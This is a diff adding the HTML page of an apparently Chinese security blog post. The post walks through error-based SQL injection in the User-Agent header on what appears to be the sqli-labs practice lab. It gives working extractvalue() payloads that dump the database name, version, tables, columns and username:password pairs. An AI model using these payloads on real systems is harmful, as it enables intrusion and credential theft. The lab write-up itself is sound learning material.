@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <meta name="description" content="0x00原理：HTTP头中的参数带入到数据库被执行，造成了HTTP头注入。
+$_SERVER详解1234567891011121314151617181920212223$_SERVER[&amp;#x27;SCRIPT_NAME&amp;#x27;]          //当前脚本的路径dirname($_SER" />
+  
+
+  
+  
+  
+  
+  
+  
+  <title>POST注入-HTTP头注入 | 小白</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="0x00原理：HTTP头中的参数带入到数据库被执行，造成了HTTP头注入。 $_SERVER详解1234567891011121314151617181920212223$_SERVER[&amp;#x27;SCRIPT_NAME&amp;#x27;]          &#x2F;&#x2F;当前脚本的路径dirname($_SERVER[&amp;#x27;SCRIPT_NAME&amp;#x27;]  &#x2F;&#x2F;dirname() 返回路径中的目录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="POST注入-HTTP头注入">
+<meta property="og:url" content="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="小白">
+<meta property="og:description" content="0x00原理：HTTP头中的参数带入到数据库被执行，造成了HTTP头注入。 $_SERVER详解1234567891011121314151617181920212223$_SERVER[&amp;#x27;SCRIPT_NAME&amp;#x27;]          &#x2F;&#x2F;当前脚本的路径dirname($_SERVER[&amp;#x27;SCRIPT_NAME&amp;#x27;]  &#x2F;&#x2F;dirname() 返回路径中的目录">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205214039033.png">
+<meta property="og:image" content="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205214350305.png">
+<meta property="og:image" content="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205220615022.png">
+<meta property="og:image" content="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205220601734.png">
+<meta property="og:image" content="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205222503023.png">
+<meta property="og:image" content="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205222953053.png">
+<meta property="og:image" content="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205223005987.png">
+<meta property="og:image" content="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205223022658.png">
+<meta property="og:image" content="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205223434243.png">
+<meta property="og:image" content="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205225102107.png">
+<meta property="og:image" content="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205225118423.png">
+<meta property="og:image" content="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205225349977.png">
+<meta property="og:image" content="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205234603717.png">
+<meta property="og:image" content="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205234615471.png">
+<meta property="og:image" content="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205234819705.png">
+<meta property="og:image" content="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205234826888.png">
+<meta property="og:image" content="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205235435928.png">
+<meta property="og:image" content="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206000302280.png">
+<meta property="og:image" content="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206000402501.png">
+<meta property="og:image" content="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206000602759.png">
+<meta property="article:published_time" content="2022-02-05T13:27:35.000Z">
+<meta property="article:modified_time" content="2022-02-05T16:06:16.430Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205214039033.png">
+  
+  
+    <link rel="icon" href="/css/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  <!-- baidu webmaster push -->
+  <script src='//push.zhanzhang.baidu.com/push.js'></script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+<body class="home blog custom-background custom-font-enabled single-author">
+  <div id="page" class="hfeed site">
+      <header id="masthead" class="site-header" role="banner">
+    <hgroup>
+      <h1 class="site-title">
+        <a href="/" title="小白" rel="home">小白</a>
+      </h1>
+      
+        <h2 class="site-description hitokoto"></h2>
+        <script type="text/javascript" src="https://v1.hitokoto.cn/?encode=js"></script>
+      
+    </hgroup>
+
+    <nav id="site-navigation" class="main-navigation" role="navigation">
+            <button class="menu-toggle">菜单</button>
+            <a class="assistive-text" href="/#content" title="跳至内容">跳至内容</a><!--TODO-->
+            <div class="menu-main-container">
+                <ul id="menu-main" class="nav-menu">
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/">Home</a></li>
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/archives">Archives</a></li>
+                
+                </ul>
+            </div>
+    </nav>
+</header>
+
+      <div id="main" class="wrapper">
+        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-POST注入-HTTP头注入" class="post-POST注入-HTTP头注入 post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title article-title">
+      POST注入-HTTP头注入
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/" data-id="ckza15jii00027gmahtng48u5" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><h5 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h5><p>HTTP头中的参数带入到数据库被执行，造成了HTTP头注入。</p>
+<h3 id="SERVER详解"><a href="#SERVER详解" class="headerlink" title="$_SERVER详解"></a>$_SERVER详解</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>]          <span class="comment">//当前脚本的路径</span></span><br><span class="line">dirname(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>]  <span class="comment">//dirname() 返回路径中的目录部分</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>]      <span class="comment">//当前脚本执行的绝对路径</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>]            <span class="comment">//获取当前域名</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_NAME&#x27;</span>]          <span class="comment">//输出配置文件httpd.conf中的ServerName，一般情况下与HTTP_HOST值相同</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SystemRoot&#x27;</span>]           <span class="comment">//当前服务器的操作系统的目录</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>]      <span class="comment">//服务器软件配置信息</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PORT&#x27;</span>]          <span class="comment">//服务器端口</span></span><br><span class="line"><span class="variable">$_SERVER</span> [<span class="string">&#x27;REMOTE_PORT&#x27;</span>]         <span class="comment">//用户连接到服务器时所使用的端口</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADDR&#x27;</span>]          <span class="comment">//服务器的ip地址</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]          <span class="comment">//浏览网页的用户ip。</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>]        <span class="comment">//当前运行脚本所在的根目录</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_SCHEME&#x27;</span>]       <span class="comment">//服务器通信协议，是http或https。</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADMIN&#x27;</span>]         <span class="comment">//服务器管理员信息</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>]       <span class="comment">//请求数据的方式</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]          <span class="comment">//当前脚本路径，根目录之后的目录</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]             <span class="comment">//当前正在执行脚本的文件名</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_TIME&#x27;</span>]         <span class="comment">//得到请求开始时的时间戳。</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_COOKIE&#x27;</span>]          <span class="comment">//获取浏览器的cookie信息。</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CONNECTION&#x27;</span>]      <span class="comment">//当前请求的连接情况</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]      <span class="comment">//获取用户相关信息，包括用户浏览器、操作系统等信息</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT&#x27;</span>]          <span class="comment">//当前请求的ACCEPT头部信息</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>] <span class="comment">//返回用户默认的语言设置，后面的q值表示用户对该语言的喜好程度</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>查看源码可知有以下注意点：</p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205214039033.png" alt="image-20220205214039033"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]      <span class="comment">//获取用户相关信息，包括用户浏览器、操作系统等信息</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]          <span class="comment">//浏览网页的用户ip。</span></span><br></pre></td></tr></table></figure>
+
+<p>由于对uname和passwd进行了check_input()函数处理，导致在这两个字段上注入时不行的：</p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205214350305.png" alt="image-20220205214350305"></p>
+<p>但在源码中有了Insert字段，可以从这里入手。</p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205220615022.png" alt="image-20220205220615022"></p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205220601734.png" alt="image-20220205220601734"></p>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>先尝试<code>admin</code>和<code>admin</code>登录，页面返回<code>User Agent</code>信息，由此在HTTP头里进行<code>User Agent</code>字段注入</p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205222503023.png" alt="image-20220205222503023"></p>
+<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>抓包改包：</p>
+<p>抓包后将<code>User Agent</code>随便添加了几个字符，页面也同样返回了几个字符：</p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205222953053.png" alt="image-20220205222953053"></p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205223005987.png" alt="image-20220205223005987"></p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205223022658.png" alt="image-20220205223022658"></p>
+<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>爆库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &#x27;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205223434243.png" alt="image-20220205223434243"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><code>and</code>前的<code>&#39;</code>是将<code>&#39;$uagent&#39;</code>中的前<code>&#39;</code>进行闭合，使用<code>or &#39;1&#39;=&#39;1</code>将<code>&#39;$uagent&#39;</code>后面的<code>&#39;</code>闭合；</p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205225102107.png" alt="image-20220205225102107"></p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205225118423.png" alt="image-20220205225118423"></p>
+<h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>爆版本号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and extractvalue(1,concat(0x7e,(select version()),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205225349977.png" alt="image-20220205225349977"></p>
+<h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p>在爆表名的时候由于一个地方不知道什么原因试了很久，记录一下：</p>
+<p>这里一开始注入的是以下语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &#x27;and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>页面没有爆出表；</p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205234603717.png" alt="image-20220205234603717"></p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205234615471.png" alt="image-20220205234615471"></p>
+<p>当把<code>and</code>改成<code>or</code>才爆出表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &#x27;or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205234819705.png" alt="image-20220205234819705"></p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205234826888.png" alt="image-20220205234826888"></p>
+<p>这里进行了一个实验，应该是出现上述情况的原因：</p>
+<p>注入语句用<code>and</code>连接的话，单引号闭合之后形成的是<code>&#39;&#39;</code>代表空值，而后面的<code>extractvalue()</code>查询到结果为真，也就是1，在mysql中实验如图：</p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205235435928.png" alt="image-20220205235435928"></p>
+<p>空值和1<code>and</code>完之后为0，可能导致数据库不返回报错信息，导致没有爆出表名。</p>
+<h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><p>爆字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &#x27;or extractvalue(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name=&#x27;users&#x27; limit 4,1),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206000302280.png" alt="image-20220206000302280"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &#x27;or extractvalue(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name=&#x27;users&#x27; limit 5,1),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206000402501.png" alt="image-20220206000402501"></p>
+<h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><p>爆内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &#x27;or extractvalue(1,concat(0x7e,(select concat(username,&#x27;:&#x27;,password) from users limit 0,1),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206000602759.png" alt="image-20220206000602759"></p>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/">
+    <time datetime="2022-02-05T13:27:35.000Z" class="entry-date">
+        2022-02-05
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+    
+<nav class="nav-single">
+    <h3 class="assistive-text">文章导航</h3>
+    
+    
+        <span class="nav-next"><a href="/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/" rel="next">POST注入--基于Password的注入 <span class="meta-nav">→</span></a></span>
+    
+</nav><!-- .nav-single -->
+
+
+
+
+
+
+
+</div></div>
+        <div id="secondary" class="widget-area" role="complementary">
+  
+    <aside id="search" class="widget widget_search"><form role="search" method="get" accept-charset="utf-8" id="searchform" class="searchform" action="//google.com/search">
+    <div>
+        <input type="text" value="" name="s" id="s" />
+        <input type="submit" id="searchsubmit" value="搜索" />
+    </div>
+</form></aside>
+  
+    
+  
+    
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget-content">
+      <ul>
+        
+          <li>
+            <a href="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/">POST注入-HTTP头注入</a>
+          </li>
+        
+          <li>
+            <a href="/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/">POST注入--基于Password的注入</a>
+          </li>
+        
+          <li>
+            <a href="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/">SQL注入-POST注入</a>
+          </li>
+        
+          <li>
+            <a href="/2022/02/04/SQL%E6%B3%A8%E5%85%A5-Less8-Less10/">SQL注入-Less8-Less10</a>
+          </li>
+        
+          <li>
+            <a href="/2022/02/03/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA-SQL%E9%9D%B6%E5%9C%BA/">文件导入导出-SQL靶场</a>
+          </li>
+        
+      </ul>
+    </div>
+  </aside>
+
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-content">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%88%A9%E7%94%A8burpsuite%E8%BF%9B%E8%A1%8Creferer%E4%BC%AA%E9%80%A0/" rel="tag">利用burpsuite进行referer伪造</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </aside>
+
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-content tagcloud">
+      <a href="/tags/%E5%88%A9%E7%94%A8burpsuite%E8%BF%9B%E8%A1%8Creferer%E4%BC%AA%E9%80%A0/" style="font-size: 10px;">利用burpsuite进行referer伪造</a>
+    </div>
+  </aside>
+
+  
+</div>
+      </div>
+      <footer id="colophon" role="contentinfo">
+    <p>&copy; 2022 John Doe
+    All rights reserved.</p>
+    <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</footer>
+    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/js/share.js'];</script>
+
+<script src="/js/jquery-3.3.1.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/navigation.js"></script>
+
+<div id="bg"></div>
+
+  </div>
+</body>
+</html>
